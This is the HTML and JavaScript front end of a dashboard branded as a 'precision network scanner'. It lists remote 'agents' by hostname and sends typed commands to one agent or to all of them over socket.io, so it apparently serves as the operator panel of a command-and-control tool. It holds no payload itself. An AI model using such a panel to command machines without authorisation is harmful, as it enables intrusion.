<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ELYPTIA | PRECISION NETWORK SCANNER</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet" />
    <style>
        :root {
            --bg: #050505;
            --accent: #00f2ff; /* Cyan / Teal pour Precision Scan */
            --border: rgba(0, 242, 255, 0.2);
            --glass: rgba(10, 10, 10, 0.9);
            --text: #e0e0e0;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'JetBrains Mono', monospace;
            height: 100vh; overflow: hidden;
        }

        .app-container {
            display: grid; grid-template-columns: 300px 1fr;
            height: 100vh; padding: 15px; gap: 15px; overflow: hidden;
        }

        .sidebar {
            background: var(--glass);
            border: 1px solid var(--border);
            border-radius: 8px; padding: 15px;
            display: flex; flex-direction: column; gap: 10px;
            min-height: 0; overflow-y: auto;
        }

        .agent-card {
            background: rgba(255,255,255,0.02); padding: 10px;
            border-radius: 4px; cursor: pointer; border-left: 3px solid transparent;
            transition: 0.2s; font-size: 11px; flex-shrink: 0;
        }
        .agent-card.active { border-left-color: var(--accent); background: rgba(0, 242, 255, 0.05); }

        .main-content {
            display: grid; grid-template-rows: auto 1fr auto; gap: 15px; min-height: 0;
        }

        .terminal-container {
            background: rgba(0, 0, 0, 0.9);
            border: 1px solid var(--border);
            border-radius: 8px; display: flex; flex-direction: column; min-height: 0;
            box-shadow: inset 0 0 30px rgba(0, 242, 255, 0.05);
        }

        .terminal-header {
            padding: 8px 15px; background: rgba(0, 242, 255, 0.05);
            font-size: 10px; border-bottom: 1px solid var(--border);
            display: flex; justify-content: space-between; text-transform: uppercase;
        }

        #terminal-output {
            flex: 1; padding: 15px; overflow-y: auto;
            font-size: 13px; line-height: 1.4; color: #fff;
        }

        .response-block {
            margin-bottom: 15px; white-space: pre-wrap;
            border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 15px;
        }

        .input-bar {
            display: flex; gap: 10px; background: var(--glass);
            padding: 12px; border: 1px solid var(--border); border-radius: 8px;
        }

        input {
            flex: 1; background: transparent; border: none;
            color: var(--accent); outline: none; font-family: inherit; font-size: 14px;
        }
        button {
            background: var(--accent); color: #000; border: none; padding: 6px 20px;
            border-radius: 4px; font-weight: bold; cursor: pointer; font-family: 'Orbitron';
        }
    </style>
</head>
<body>
    <div class="app-container">
        <div class="sidebar">
            <h2 style="font-family:'Orbitron'; color:var(--accent); font-size:16px; margin-bottom:10px;">ELYPTIA PRÉCISION</h2>
            <div id="agent-list"></div>
        </div>

        <div class="main-content">
            <div style="background:var(--glass); border:1px solid var(--border); padding:10px 15px; border-radius:8px; display:flex; justify-content:space-between; font-size:11px;">
                <div id="active-target">SCANNER: <span style="color:var(--accent);">STANDBY</span></div>
                <div id="conn-status" style="color:#00ff88;">READY_FOR_DEPLOYMENT</div>
            </div>

            <div class="terminal-container">
                <div class="terminal-header">
                    <span>Precision_Network_Analysis_V14.exe</span>
                    <span id="timestamp">TIMESTAMP: --:--:--</span>
                </div>
                <div id="terminal-output">
                    <div class="response-block">> [BOOT] Elyptia Precision Engine v14.0 loaded.<br>> System monitoring active. Enter target IP/Domain for deep reconnaissance.</div>
                </div>
            </div>

            <div class="input-bar">
                <input type="text" id="cmd-input" placeholder="IP Cible / Domaine pour audit complet..." autocomplete="off">
                <button id="send-btn">SCAN</button>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedAgent = 'all';

        function updateTime() {
            document.getElementById('timestamp').innerHTML = "TIMESTAMP: " + new Date().toLocaleTimeString();
        }
        setInterval(updateTime, 1000);

        function addLog(msg) {
            const out = document.getElementById('terminal-output');
            const div = document.createElement('div');
            div.className = 'response-block';
            div.innerHTML = msg.replace(/\[(.*?)\]/g, '<span style="color:var(--accent);">[$1]</span>');
            out.appendChild(div);
            out.scrollTop = out.scrollHeight;
        }

        socket.on('update_dashboard', (agents) => {
            const list = document.getElementById('agent-list');
            list.innerHTML = '';
            for (const id in agents) {
                const div = document.createElement('div');
                div.className = `agent-card ${selectedAgent === id ? 'active' : ''}`;
                div.onclick = () => {
                    selectedAgent = id;
                    document.getElementById('active-target').innerHTML = `TARGETING: <span style="color:var(--accent);">${id}</span>`;
                    document.querySelectorAll('.agent-card').forEach(c => c.classList.remove('active'));
                    div.classList.add('active');
                };
                div.innerHTML = `<b>${id}</b><br>${agents[id].hostname}`;
                list.appendChild(div);
                if (selectedAgent === 'all') div.click();
            }
        });

        socket.on('display_response', (data) => {
            addLog(data.output);
        });

        function doSend() {
            const input = document.getElementById('cmd-input');
            const val = input.value.trim();
            if (!val || !socket.connected) return;
            socket.emit('dispatch_command', { target: selectedAgent, command: val });
            addLog(`> Initiating Precision Scan on ${val}...`);
            input.value = '';
        }

        document.getElementById('send-btn').onclick = doSend;
        document.getElementById('cmd-input').onkeypress = (e) => { if(e.key === 'Enter') doSend(); };
    </script>
</body>
</html>
